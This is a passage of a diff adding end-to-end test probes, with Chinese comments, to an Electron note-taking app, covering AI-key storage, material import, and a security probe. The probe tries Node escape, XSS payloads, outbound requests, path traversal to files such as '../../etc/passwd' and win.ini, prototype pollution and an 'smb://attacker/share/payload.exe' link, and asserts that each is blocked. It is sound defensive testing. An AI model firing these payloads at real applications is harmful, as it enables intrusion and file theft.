+  out.noKeyError = blocked.ok ? '' : String(blocked.error || '')
+  out.noKeyBlocked = !blocked.ok && out.noKeyError.indexOf('API Key') >= 0
+
+  /* ---- 5. 回到本机地址（**依然没有密钥**）打开 AI 对话框：
+     这一步是「本地模型不用密钥也能用」的实证——如果判据挂在预设 id 上、
+     或者界面和主进程的判据不一致，这里就会冒出「还没配置 AI 服务」的拦截 */
+  setValue('#set-ai-provider', 'ollama')
+  await waitForValue('#set-ai-base', 'http://127.0.0.1:11434/v1', 6000)
+
+  document.querySelector('[data-route="notes"]').click()
+  const item2 = await waitFor('[data-role="list"] [data-note="' + note.id + '"]', 8000)
+  if (item2) item2.click()
+  await waitFor('[data-role="stage"] .cm-editor', 8000)
+
+  const aiButton2 = await waitFor('[data-action="ai"]')
+  if (aiButton2) aiButton2.click()
+  out.chipsOk = await waitForCount('.sb-ai__presets .sb-chip', 6, 5000)
+  out.modalOk = out.chipsOk && visible(document.querySelector('#sb-ai-instruction'))
+  // 没有密钥却没有被拦下来，才说明本机地址那条豁免真的生效了
+  out.openedWithoutKey = !document.querySelector('.sb-modal__card [data-role="confirm"]')
+
+  const firstChip = document.querySelector('.sb-ai__presets .sb-chip')
+  if (firstChip) firstChip.click()
+  await wait(300)
+  const instruction = document.querySelector('#sb-ai-instruction')
+  out.presetOk = Boolean(instruction) && instruction.value.length > 0
+
+  document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))
+  await wait(200)
+  out.modalClosed = !document.querySelector('.sb-ai__presets')
+
+  /* ---- 6. 保存 / 清除密钥 */
+  document.querySelector('[data-route="settings"]').click()
+  const provider3 = await waitFor('#set-ai-provider', 8000)
+  if (provider3) setValue('#set-ai-provider', 'zhipu')
+  await waitForValue('#set-ai-base', 'https://open.bigmodel.cn/api/paas/v4', 6000)
+
+  const keyInput = await waitFor('#set-ai-key')
+  if (keyInput) keyInput.value = KEY
+  const saveButton = document.querySelector('[data-action="save-ai-key"]')
+  if (saveButton) saveButton.click()
+  await waitForText('[data-role="ai-state"]', '已保存密钥', 8000)
+
+  const afterSave = await window.studyBoard.settings.get()
+  const stateText = (document.querySelector('[data-role="ai-state"]') || {}).textContent || ''
+  out.saveOk =
+    stateText.indexOf('已保存密钥') >= 0 && afterSave.ok && afterSave.data.ai.hasApiKey === true
+
+  if (!out.saveOk) {
+    // 没有系统钥匙串的机器（比如没装 keyring 的 Linux）会走到这条路上。
+    // 那时候**正确的行为就是拒绝保存**，而不是退化成明文——那也算通过
+    const refused = await window.studyBoard.secrets.setAiKey(KEY)
+    out.refusalError = refused.ok ? '' : String(refused.error || '')
+    out.keyringUnavailable = !refused.ok && out.refusalError.indexOf('密钥库不可用') >= 0
+    out.refusalOk = out.keyringUnavailable
+  } else {
+    const clearButton = document.querySelector('[data-action="clear-ai-key"]')
+    if (clearButton) clearButton.click()
+    await waitForText('[data-role="ai-state"]', '尚未配置', 8000)
+    const afterClear = await window.studyBoard.settings.get()
+    out.clearOk = afterClear.ok && afterClear.data.ai.hasApiKey === false
+
+    // 再存回去：主进程稍后要去磁盘上验密文，文件里得有东西
+    const again = await window.studyBoard.secrets.setAiKey(KEY)
+    out.restored = again.ok === true
+  }
+
+  /* ---- 7. 关于页同样不能把机器记号直接摆给人看 */
+  const aboutEl = document.querySelector('[data-role="about"]')
+  const aboutNoteEl = document.querySelector('[data-role="about-note"]')
+  const aboutText = aboutEl ? aboutEl.textContent : ''
+  const aboutNote = aboutNoteEl ? aboutNoteEl.textContent : ''
+  out.aboutPlatform = aboutText
+  out.aboutOk = Boolean(
+    aboutText.indexOf('win32') < 0 &&
+      aboutText.indexOf('darwin') < 0 &&
+      (aboutText.indexOf('Windows') >= 0 ||
+        aboutText.indexOf('macOS') >= 0 ||
+        aboutText.indexOf('Linux') >= 0) &&
+      aboutText.indexOf('位') >= 0 &&
+      // 「适配哪些系统」这句话是固定文案（进程没法知道自己被打成了哪个架构），
+      // 但它必须存在——用户问的就是这个
+      aboutNote.indexOf('64 位') >= 0
+  )
+
+  return JSON.stringify(out)
+})()`
+}
+
+/* --------------------------------------------------- 安全渗透 */
+
+/**
+ * 安全攻击探针。
+ *
+ * 模拟的前提是最坏情况：**渲染层里已经住进一段攻击者的内容**（比如一篇导入的
+ * 恶意笔记）。这段探针就是那个攻击者，按「能想到的所有手法」逐条尝试：
+ *
+ *  A. Node 逃逸（拿到 process/require 就等于拿了整台机器）
+ *  B. 内联脚本与事件处理器（CSP 有没有真的挡住执行）
+ *  C. 出网（fetch / WebSocket / 图片 beacon——渲染层不该发出任何远程请求）
+ *  D. sb-asset:// 协议穿越（能不能越桶、能不能跳出数据目录读任意文件）
+ *  E. IPC 模糊测试（把每个通道喂满垃圾：穿越字符串、错误类型、超长输入、原型污染）
+ *  F. 弹窗劫持（window.open 非白名单协议）
+ *
+ * 导航劫持（改 location）单独跑，因为它一旦成功探针自己就死了。
+ *
+ * 探针的两个自我约束：
+ *  - 是 executeJavaScript 注入的特权代码，所以探针**自己**能跑——
+ *    它注入的 payload 是页面内容，受 CSP 管。两者不会互相污染结论
+ *  - 所有「攻击」的对象都是种子数据或临时文件，绝不碰系统真实文件
+ */
+const SECURITY_PROBE = `(async () => {
+  ${PROBE_HELPERS}
+  const out = {}
+  const call = async (fn) => {
+    try {
+      return await fn()
+    } catch (error) {
+      return { thrown: error instanceof Error ? error.message : String(error) }
+    }
+  }
+
+  /* ================ A. Node 逃逸 ================ */
+  // 沙箱 + contextIsolation 之下，以下每一样都该是 undefined。
+  // 任何一样拿到了，攻击者就能读文件、起进程，后面的一切防线都没有意义
+  out.escape = {
+    process: typeof process,
+    require: typeof require,
+    globalProcess: typeof globalThis.process,
+    buffer: typeof Buffer,
+    nodeModules: typeof module,
+    // 经典逃逸路径：顶层窗口、opener、iframe 的 contentWindow
+    viaTop: typeof (window.top && window.top.process),
+    viaIframeContentWindow: (() => {
+      // frame-src 'none' 之下 iframe 应该根本建不起来；建起来也不该有 process
+      try {
+        const f = document.createElement('iframe')
+        document.body.appendChild(f)
+        const win = f.contentWindow
+        return typeof (win && win.process)
+      } catch {
+        return 'blocked'
+      }
+    })()
+  }
+  out.escapeOk = Object.values(out.escape).every(
+    (value) => value === 'undefined' || value === 'blocked'
+  )
+
+  // preload 暴露面：window 上只允许有 studyBoard 这一个注入对象
+  out.preloadSurface = Object.keys(window).filter((key) => key === 'studyBoard')
+  out.studyBoardMethods = Object.keys(window.studyBoard || {}).sort()
+  // 密钥必须只有 set/clear，不能有任何读明文的通道
+  out.secretsGetters = Object.keys((window.studyBoard || {}).secrets || {})
+    .filter((name) => name.toLowerCase().includes('get'))
+  out.preloadOk = out.preloadSurface.length === 1 && out.secretsGetters.length === 0
+
+  /* ================ B. 内联脚本 / 事件处理器（CSP 执行面） ================ */
+  // 探针自己往页面里种 payload——它就是「渲染层已经住进来的一段恶意内容」
+  const script = document.createElement('script')
+  script.textContent = 'window.__sbPwned1 = 1'
+  document.body.appendChild(script)
+
+  const imgEvil = document.createElement('img')
+  imgEvil.setAttribute('src', 'sb-asset://icon/nope')
+  // 事件处理器用字符串 attribute 形式——这才是 CSP 该挡的那一类
+  imgEvil.setAttribute('onerror', 'window.__sbPwned2 = 1')
+  document.body.appendChild(imgEvil)
+
+  const link = document.createElement('a')
+  link.setAttribute('href', 'javascript:window.__sbPwned3 = 1')
+  document.body.appendChild(link)
+  link.click()
+
+  await wait(700)
+  out.xss = {
+    viaScriptTag: window.__sbPwned1,
+    viaImgOnerror: window.__sbPwned2,
+    viaJavascriptUrl: window.__sbPwned3
+  }
+  out.xssBlocked = Object.values(out.xss).every((value) => value === undefined)
+
+  /* ================ C. 出网（CSP 网络面） ================ */
+  // fetch 远程：connect-src 'self' 应该同步就拒绝，请求根本不发出
+  let fetchResult = 'unknown'
+  try {
+    await fetch('https://example.com/sb-csp-probe')
+    fetchResult = 'reached-network'
+  } catch (error) {
+    fetchResult = 'blocked'
+  }
+  // WebSocket 是异步失败，挂事件再等
+  let wsResult = 'unknown'
+  try {
+    const ws = new WebSocket('wss://example.com/sb-csp-probe')
+    ws.addEventListener('open', () => { wsResult = 'reached-network' }, { once: true })
+    ws.addEventListener('error', () => { wsResult = 'blocked' }, { once: true })
+  } catch {
+    wsResult = 'blocked'
+  }
+  // 图片 beacon：img-src 不含 https，远程图片应该被拦
+  let beaconResult = 'unknown'
+  const beacon = new Image()
+  beacon.onload = () => { beaconResult = 'reached-network' }
+  beacon.onerror = () => { beaconResult = 'blocked' }
+  beacon.src = 'https://example.com/sb-beacon.png'
+  await wait(800)
+  out.network = { fetchResult, wsResult, beaconResult }
+  out.networkBlocked =
+    fetchResult === 'blocked' && wsResult === 'blocked' && beaconResult === 'blocked'
+
+  /* ================ D. sb-asset:// 协议穿越 ================ */
+  const tryAsset = (url) => new Promise((resolve) => {
+    const probe = new Image()
+    const done = (result) => resolve(result)
+    probe.onload = () => done('loaded')
+    probe.onerror = () => done('blocked')
+    setTimeout(() => done('timeout'), 2500)
+    probe.src = url
+  })
+
+  // 从课表数据里拿靶子的真实文件名：addImages 导入会把它归一化成 <id>.png，
+  // 名字猜不得——猜错名字拿到的是 404，那跟「被挡了」就分不开了
+  const timetableData = await window.studyBoard.timetable.get()
+  const probeFile =
+    timetableData.ok && timetableData.data.images.length > 0
+      ? timetableData.data.images[0].fileName
+      : ''
+  if (!probeFile) return JSON.stringify({ error: '课表图片靶子没种上' })
+
+  // 对照组：正常路径必须能读到（区分「被挡」与「文件不存在」）
+  out.assetNormal = await tryAsset('sb-asset://timetable/' + probeFile)
+  // URL 编码穿越（%2e%2e 不参与 URL 解析时的点段折叠，穿过 assetProtocol 的
+  // decodeURIComponent 后才还原成 .. ——真实攻击者的手法，轮到 safeJoin 挡）
+  out.assetEscapeDotDot = await tryAsset(
+    'sb-asset://icon/%2e%2e%2ftimetable_images%2f' + probeFile
+  )
+  // 反斜杠穿越（Windows 上 \\ 也是分隔符）
+  out.assetEscapeBackslash = await tryAsset(
+    'sb-asset://icon/..%5Ctimetable_images%5C' + probeFile
+  )
+  // 连跳多级跳出数据目录
+  out.assetEscapeRoot = await tryAsset(
+    'sb-asset://icon/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fWindows%2fexplorer.exe'
+  )
+  // 未知桶
+  out.assetEscapeBucket = await tryAsset('sb-asset://hack/' + probeFile)
+  // 绝对路径注入
+  out.assetEscapeAbsolute = await tryAsset(
+    'sb-asset://icon/%43%3a%5cWindows%5Cwin.ini'
+  )
+  out.assetEscapeOk =
+    out.assetNormal === 'loaded' &&
+    [out.assetEscapeDotDot, out.assetEscapeBackslash, out.assetEscapeRoot,
+     out.assetEscapeBucket, out.assetEscapeAbsolute]
+      .every((result) => result === 'blocked')
+
+  /* ================ E. IPC 模糊测试 ================ */
+  const notesList = await window.studyBoard.notes.list()
+  const victim = notesList.ok ? notesList.data.find((n) => n.title === '安全探针') : null
+  const victimId = victim ? victim.id : ''
+
+  // 1) 笔记 id 路径穿越
+  out.fuzzNoteReadTraversal = await call(() => window.studyBoard.notes.read('../../etc/passwd'))
+  out.fuzzNoteReadAbsolute = await call(() =>
+    window.studyBoard.notes.read('C:\\\\Windows\\\\win.ini')
+  )
+  // 2) 重命名注入：路径分隔符 + HTML。safeNoteTitle 应该把它们洗掉，而不是拒绝报错
+  out.fuzzRenameEvil = victimId
+    ? await call(() =>
+        window.studyBoard.notes.rename({ id: victimId, title: '..\\\\..\\\\evil<script>' })
+      )
+    : { skipped: true }
+  // 重命名注入之后笔记必须还能读回来。
+  // 曾经有个真 bug：title 以 . 开头时文件写得出来，但 #scan 把它当隐藏文件忽略，
+  // 下一次对账直接把索引摘掉——笔记凭空「隐形」，卡片关联也被解开。
+  // 这行断言就是那个 bug 的守门员
+  const rereadAfterRename = victimId
+    ? await call(() => window.studyBoard.notes.read(victimId))
+    : { skipped: true }
+  out.renameRoundTrip = Boolean(
+    rereadAfterRename && rereadAfterRename.ok === true && rereadAfterRename.data
+  )
+  // 3) 创建含 HTML 的标题
+  out.fuzzCreateScript = await call(() =>
+    window.studyBoard.notes.create('<img src=x onerror=alert(1)>')
+  )
+  // 4) 导出：相对路径、错误扩展名、null 字节
+  out.fuzzExportRelative = victimId
+    ? await call(() =>
+        window.studyBoard.exporter.note({ noteId: victimId, format: 'md', targetPath: 'evil.md' })
+      )
+    : { skipped: true }
+  out.fuzzExportWrongExt = victimId
+    ? await call(() =>
+        window.studyBoard.exporter.note({
+          noteId: victimId, format: 'md', targetPath: 'C:\\\\Windows\\\\Temp\\\\evil.exe'
+        })
+      )
+    : { skipped: true }
+  // 5) 原型污染：三种注入路径（__proto__、constructor.prototype、同名深链）
+  await call(() =>
+    window.studyBoard.cards.upsert({
+      courseName: 'pp-test',
+      __proto__: { polluted: true },
+      constructor: { prototype: { polluted2: true } }
+    })
+  )
+  out.protoPolluted = Boolean(
+    ({}).polluted || Object.prototype.polluted || ({}).polluted2 || Object.prototype.polluted2
+  )
+  // 6) 非法状态值
+  out.fuzzStatusEvil = await call(() =>
+    window.studyBoard.cards.setStatus({ id: 'no-such-card', status: 'pwned' })
+  )
+  // 7) 超长输入（1MB 课程名）
+  out.fuzzHugeInput = await call(() =>
+    window.studyBoard.cards.upsert({ courseName: 'A'.repeat(1000000) })
+  )
+  // 8) 错误类型喂整份 settings
+  out.fuzzSettingsType = await call(() =>
+    window.studyBoard.settings.patch({ theme: 'evil', timetable: { periodCount: -999 } })
+  )
+  // 9) 非法课表单元格 key
+  out.fuzzCellKey = await call(() =>
+    window.studyBoard.timetable.setCell({
+      key: '99999:99',
+      cell: { courseName: 'x', teacher: '', location: '', duration: '', remark: '' }
+    })
+  )
+  // 10) openExternal 协议注入（修复的回归验证：file:// 之前能直通系统）
+  out.fuzzExternalFile = await call(() =>
+    window.studyBoard.app.openExternal('file:///C:/Windows/System32/cmd.exe')
+  )
+  out.fuzzExternalJs = await call(() =>
+    window.studyBoard.app.openExternal('javascript:alert(1)')
+  )
+  out.fuzzExternalSmb = await call(() =>
+    window.studyBoard.app.openExternal('smb://attacker/share/payload.exe')
+  )
+  // 11) 任意路径打开 / 定位
+  out.fuzzOpenPath = await call(() => window.studyBoard.app.openPath('C:\\\\Windows'))
+  out.fuzzRevealPath = await call(() =>
+    window.studyBoard.app.revealPath('..\\\\..\\\\..\\\\Windows')
+  )
+
+  const isRejected = (result) =>
+    result && typeof result === 'object' && result.ok === false && !result.thrown
+  out.fuzz = {
+    fuzzNoteReadTraversal: out.fuzzNoteReadTraversal,
+    fuzzNoteReadAbsolute: out.fuzzNoteReadAbsolute,
+    fuzzRenameEvil: out.fuzzRenameEvil,
+    fuzzCreateScript: out.fuzzCreateScript,
+    fuzzExportRelative: out.fuzzExportRelative,
+    fuzzExportWrongExt: out.fuzzExportWrongExt,
+    fuzzStatusEvil: out.fuzzStatusEvil,
+    fuzzHugeInput: out.fuzzHugeInput,
+    fuzzSettingsType: out.fuzzSettingsType,
+    fuzzCellKey: out.fuzzCellKey,
+    fuzzExternalFile: out.fuzzExternalFile,
+    fuzzExternalJs: out.fuzzExternalJs,
+    fuzzExternalSmb: out.fuzzExternalSmb,
+    fuzzOpenPath: out.fuzzOpenPath,
+    fuzzRevealPath: out.fuzzRevealPath
+  }
+  // 每一类攻击要么被拒绝（ok:false），要么被清洗后正常完成（ok:true 但数据已无害）。
+  // 不能接受的是：异常穿透（thrown）或进程崩溃
+  out.fuzzSurvived = Object.values(out.fuzz).every(
+    (result) => result && typeof result === 'object' && 'ok' in result
+  )
+  // 这几条必须是被明确拒绝的，不能「成功」
+  out.fuzzMustReject = [
+    out.fuzzNoteReadTraversal, out.fuzzNoteReadAbsolute,
+    out.fuzzExportRelative, out.fuzzExportWrongExt,
+    out.fuzzExternalFile, out.fuzzExternalJs, out.fuzzExternalSmb,
+    out.fuzzOpenPath, out.fuzzRevealPath
+  ].every(isRejected)
+  out.protoClean = !out.protoPolluted
+  // 重命名注入之后笔记还在（见上面的注释，这是「能写出的文件名」与
+  // 「能扫回的文件名」集合必须重合的守门员）
+  out.renameRoundTripOk = out.renameRoundTrip
+
+  /* ================ F. 弹窗劫持 ================ */
+  // file:// 协议不在白名单，必须 deny（返回 null）且不会交给系统程序。
+  // 这是刚才修复的裸 shell.openExternal 的回归验证
+  let openResult = 'unknown'
+  try {
+    const opened = window.open('file:///C:/Windows/System32/notepad.exe')
+    openResult = opened === null ? 'denied' : 'opened'
+  } catch {
+    openResult = 'thrown'
+  }
+  out.windowOpenResult = openResult
+  out.windowOpenOk = openResult === 'denied' || openResult === 'thrown'
+
+  return JSON.stringify(out)
+})()`
+
+const SECURITY_HIJACK_PROBE = `(async () => {
+  const wait = (ms) => new Promise((r) => setTimeout(r, ms))
+  const before = location.href
+  try {
+    location.href = 'https://example.com/sb-hijack-probe'
+  } catch { /* 拦截表现之一 */ }
+  await wait(1500)
+  return JSON.stringify({ before, after: location.href, hijacked: location.href !== before })
+})()`
+
+/**
+ * 课程资料探针。
+ *
+ * 四条链路各验一段：
+ *  - API 导入（拖拽/按钮背后的通道）：真 PDF / 真 PPTX 入库、文件名带课程前缀
+ *  - 魔数闸口：扩展名像 PDF、内容不是的文件必须被拒收
+ *  - 改名往返：改名后索引与磁盘上的文件名都对得上（S2 教训的资料版）
+ *  - 收件箱整链路：主进程发现收件箱里的新文件 → 弹归属对话框 → 选课导入
+ *    （原文件由主进程移入系统回收站）
+ */
+const MATERIALS_PROBE_SRC = (paths: string[]) => `(async () => {
+  ${PROBE_HELPERS}
+  const out = {}
+
+  /* ---- 1. 导入两个真文件（归属到「高等数学 A」） */
+  const cardsList = await window.studyBoard.cards.list()
+  if (!cardsList.ok || cardsList.data.length === 0) return JSON.stringify({ error: '没有卡片可归属' })
+  const cardId = cardsList.data[0].id
+
+  const nav = await waitFor('[data-route="materials"]')
+  if (!nav) return JSON.stringify({ error: '导航未就绪' })
+  nav.click()
+  await waitFor('[data-role="materials"]')
+
+  const first = await window.studyBoard.materials.import({
+    paths: ${JSON.stringify(paths.slice(0, 2))},
+    courseCardId: cardId,
+    title: '第3章极限'
+  })
+  out.importAdded = first.ok ? first.data.added : -1
+  out.importList = first.ok ? first.data.materials.map((m) => m.fileName) : []
+  out.importOk = first.ok && first.data.added === 2
+  // 文件名必须带课程前缀：在 Obsidian / 资源管理器里翻文件就靠它
+  out.prefixOk = first.ok && first.data.materials.every((m) => m.fileName.startsWith('高等数学 A_'))
+
+  /* ---- 2. 魔数闸口：扩展名像 PDF、内容不是的文件必须被拒收 */
+  const fake = await window.studyBoard.materials.import({
+    paths: [${JSON.stringify(paths[2])}],
+    courseCardId: cardId
+  })
+  out.fakeRejected = fake.ok && fake.data.added === 0 && fake.data.errors.length === 1 &&
+    fake.data.errors[0].indexOf('不符') >= 0
+
+  /* ---- 3. 改名往返：索引与磁盘都要对上 */
+  const listNow = await window.studyBoard.materials.list()
+  // 精确挑 pdf 那份：两个导入名只差扩展名，模糊匹配会挑错人（老坑）
+  const target = listNow.ok ? listNow.data.find((m) => m.ext === 'pdf') : null
+  if (!target) return JSON.stringify({ error: '找不到刚导入的资料', ...out })
+  const renamed = await window.studyBoard.materials.rename({ id: target.id, title: '函数与极限' })
+  out.renameOk = renamed.ok &&
+    renamed.data.some((m) => m.id === target.id && m.fileName === '高等数学 A_函数与极限.pdf')
+
+  /* ---- 4. 卡片角标：课程与学习页上应该显示这份资料的数字 */
+  document.querySelector('[data-route="study"]').click()
+  const cardShown = await waitForCount('.sb-itemcard', 1)
+  const matsBadge = document.querySelector('.sb-itemcard__mats')
+  out.badgeText = matsBadge ? matsBadge.textContent.trim() : ''
+  out.badgeOk = Boolean(cardShown && matsBadge && out.badgeText.indexOf('2') >= 0)
+
+  /* ---- 5. 删除：库目录里少一份（文件进回收站） */
+  document.querySelector('[data-route="materials"]').click()
+  await waitFor('[data-role="materials"]')
+  const before = await window.studyBoard.materials.list()
+  const pptx = before.ok ? before.data.find((m) => m.ext === 'pptx') : null
+  const removed = pptx ? await window.studyBoard.materials.remove(pptx.id) : { ok: false }
+  out.removeOk = removed.ok && removed.data.length === 1
+
+  /* ---- 6. 收件箱整链路：主进程广播 → 弹归属对话框 → 导入 */
+  // 首扫在主进程启动 3 秒后触发，这里最多等 12 秒让它弹出对话框
+  const dialogCard = await waitFor('.sb-modal__card--form', 12000)
+  out.inboxDialogShown = Boolean(dialogCard)
+  if (dialogCard) {
+    const select = dialogCard.querySelector('[data-field="course"]')
+    if (select) {
+      select.value = cardId
+      select.dispatchEvent(new Event('change', { bubbles: true }))
+    }
+    const save = dialogCard.querySelector('[data-role="save"]')
+    if (save) save.click()
+    const inboxDone = await waitForCount('.sb-material', 2)
+    const finalList = await window.studyBoard.materials.list()
+    out.inboxOk = inboxDone &&
+      finalList.ok &&
+      finalList.data.some((m) => m.fileName === '高等数学 A_教学大纲.pdf')
+  }
+
+  return JSON.stringify({
+    ...out,
+    ok: out.importOk && out.prefixOk && out.fakeRejected && out.renameOk &&
+      out.badgeOk && out.removeOk && out.inboxOk
+  })
+})()`
+
+function materialsProbe(): string {
+  return MATERIALS_PROBE_SRC(materialSourcePaths())
 }
 
 /* --------------------------------------------------- 文件监听（双向同步） */
